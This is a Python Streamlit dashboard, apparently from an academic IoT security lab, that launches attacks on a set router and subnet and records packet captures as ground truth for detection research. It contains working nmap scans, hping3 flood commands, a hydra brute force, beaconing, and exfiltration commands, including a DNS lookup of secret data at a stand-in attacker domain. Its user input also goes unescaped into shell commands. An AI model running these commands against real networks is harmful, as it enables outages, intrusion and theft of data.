import streamlit as st
import subprocess
import time
import json
import os
from datetime import datetime

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Attack Framework - ISEP", layout="wide")
st.title("🛡️ Dashboard de Injeção de Ataques IoT")

# --- SIDEBAR: CONFIGURAÇÕES DE REDE ---
st.sidebar.header("⚙️ Configurações de Rede")
target_ip = st.sidebar.text_input("IP do Alvo (Router)", value="192.168.1.1")
interface = st.sidebar.text_input("Interface de Injeção (Ataque)", value="eth1")
monitor_interface = st.sidebar.text_input("Interface de Monitorização", value="eth0")
target_subnet = st.sidebar.text_input("Target Subnet", value="192.168.1.0/24")

st.sidebar.divider()
if st.sidebar.button("🗑️ Limpar Histórico de Logs"):
    if os.path.exists("attack_log.json"):
        os.remove("attack_log.json")
        st.sidebar.success("Logs eliminados!")
        st.rerun()

# --- FUNÇÃO PARA LOGGING (GROUND TRUTH) ---
def log_attack(attack_type, variant, start_time, end_time, pcap_file):
    entry = {
        "timestamp_start": start_time,
        "timestamp_end": end_time,
        "attack": attack_type,
        "variant": variant,
        "target": target_ip,
        "pcap_generated": pcap_file,
        "status": "SUCCESS"
    }
    with open("attack_log.json", "a") as f:
        f.write(json.dumps(entry) + "\n")

# --- FUNÇÃO MESTRE: ORQUESTRAÇÃO (CAPTURAR + ATACAR) ---
def run_command(cmd, attack_type, variant):
    timestamp_id = int(time.time())
    pcap_name = f"ataque_{variant}_{timestamp_id}.pcap"
    pcap_path = f"/tmp/{pcap_name}"
    
    start_dt = datetime.now()
    start_iso = start_dt.isoformat()
    
    status_text = st.empty()
    
    try:
        # 1. Iniciar Captura (Tshark) com buffer de segurança
        status_text.info(f"🛰️ A iniciar captura na {monitor_interface}...")
        tshark_proc = subprocess.Popen([
            "sudo", "tshark", "-i", monitor_interface, "-w", pcap_path
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(5) # Dá tempo ao tshark para estabilizar no disco

        # 2. Executar o Ataque Real
        status_text.warning(f"⚔️ A injetar {variant} via {interface}...")
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 3. Finalização da Captura (Paciência de Engenharia)
        time.sleep(2) # Aguarda que os últimos pacotes saiam do buffer da placa
        status_text.info("🏁 A finalizar captura e a processar ficheiro...")
        tshark_proc.terminate()
        time.sleep(3) # Tempo para o SO fechar o ficheiro .pcap corretamente
        
        # 4. Ajustar permissões para o utilizador Kali
        subprocess.run(["sudo", "chown", "kali:kali", pcap_path])
        
        end_iso = datetime.now().isoformat()
        
        # 5. Registar no Log
        log_attack(attack_type, variant, start_iso, end_iso, pcap_name)
        
        status_text.success(f"✅ Experiência Concluída! PCAP: {pcap_name}")
        st.toast(f"Ataque {variant} finalizado!")
        
        with st.expander("Ver detalhes do comando (Console Output)"):
            if process.stdout:
                st.code(process.stdout)
            else:
                st.write("O comando foi executado silenciosamente (verifique o PCAP).")
            
    except Exception as e:
        st.error(f"Erro na orquestração: {e}")

# --- INTERFACE PRINCIPAL (TABS) ---
tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs([
    "Scanning Vertical", "Scanning Horizontal", "DDoS/Flood", "Brute Force", "Beaconing", "Exfiltração"
])

with tab1:
    st.header("🔍 Varrimento Vertical (Router)")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Scan"):
        run_command(f"sudo nmap -e {interface} -sS -p 1-1024 {target_ip}", "Port Scan", "SYN-Vertical")
    if col2.button("V2: Connect Scan"):
        run_command(f"sudo nmap -e {interface} -sT -p 1-1024 {target_ip}", "Port Scan", "Connect-Vertical")
    if col3.button("V3: UDP Scan"):
        run_command(f"sudo nmap -e {interface} -sU -p 53,161,1900 {target_ip}", "Port Scan", "UDP-Vertical")

with tab2:
    st.header("🌐 Varrimento Horizontal (LAN)")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: Ping Sweep"):
        run_command(f"sudo nmap -e {interface} -sn {target_subnet}", "Network Scan", "Ping-Sweep")
    if col2.button("V2: Web Sweep"):
        run_command(f"sudo nmap -e {interface} -sS -p 80,443 {target_subnet}", "Network Scan", "Web-Discovery")
    if col3.button("V3: OS Fingerprinting"):
        st.warning("Este ataque pode demorar vários minutos.")
        run_command(f"sudo nmap -e {interface} -O --osscan-limit {target_subnet}", "Network Scan", "OS-Fingerprinting")    

with tab3:
    st.header("💣 DDoS Volumétrico")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Flood"):
        run_command(f"sudo timeout 15 hping3 -S --flood -V -p 80 --rand-source -I {interface} {target_ip}", "DDoS", "SYN-Flood")
    if col2.button("V2: UDP Flood"):
        run_command(f"sudo timeout 15 hping3 --udp --flood -V -p 53 --rand-source -I {interface} {target_ip}", "DDoS", "UDP-Flood")
    if col3.button("V3: ICMP Flood"):
        run_command(f"sudo timeout 15 hping3 -1 --flood -V --rand-source -I {interface} {target_ip}", "DDoS", "ICMP-Flood")  

with tab4:
    st.header("🔑 Acesso (Brute Force)")
    if st.button("Executar HTTP Brute Force"):
        run_command(f"hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 {target_ip} http-get /:F=failed", "Brute Force", "HTTP-Login")
        
with tab5:
    st.header("📡 Fase 2: Beaconing / C2")
    st.write("Simulação de periodicidade temporal (Duração: 60s).")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: ICMP Heartbeat"):
        run_command(f"sudo timeout 65 ping -I {interface} -i 5 -c 12 {target_ip}", "Beaconing", "ICMP-Periodic")
    if col2.button("V2: DNS Beaconing"):
        run_command(f"sudo timeout 65 hping3 --udp -p 53 -i 10 -c 6 -I {interface} {target_ip}", "Beaconing", "UDP-DNS-C2")
    if col3.button("V3: HTTP Beaconing"):
        # Comando robusto com timeouts e relatório de progresso
        cmd_http = f"sudo timeout 80 bash -c 'for i in {{1..4}}; do echo \"[$(date +%T)] Enviando Beacon $i...\"; curl --interface {interface} --connect-timeout 5 --max-time 10 -s http://{target_ip} > /dev/null; sleep 15; done'"
        run_command(cmd_http, "Beaconing", "HTTP-Web-C2")

with tab6:
    st.header("📤 Fase 4: Exfiltração de Dados")
    secret_data = st.text_input("Dado a Exfiltrar", value="admin_pass_isep2026")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: ICMP Stuffed"):
        run_command(f"sudo nping {target_ip} --icmp --data-string '{secret_data}' --count 1 -e {interface}", "Exfiltration", "ICMP-Data-Stuffed")
    if col2.button("V2: DNS Tunnel"):
        clean_data = secret_data.replace(" ", "_")
        run_command(f"nslookup {clean_data}.attacker-isep.com", "Exfiltration", "DNS-Tunneling")
    if col3.button("V3: HTTP Header Leak"):
        cmd_leak = f"curl --interface {interface} -H 'X-Secret-Data: {secret_data}' --connect-timeout 2 -s http://{target_ip} > /dev/null && echo 'Cabeçalho enviado com sucesso!'"
        run_command(cmd_leak, "Exfiltration", "HTTP-Header-Leak")

# --- SECÇÃO DE LOGS (GROUND TRUTH) ---
st.divider()
st.subheader("📜 Repositório de Ground Truth (Mais recentes primeiro)")
if os.path.exists("attack_log.json"):
    with open("attack_log.json", "r") as f:
        logs = f.readlines()
        for log in reversed(logs):
            st.json(json.loads(log))
else:
    st.info("Aguardando o primeiro ataque para gerar logs.")

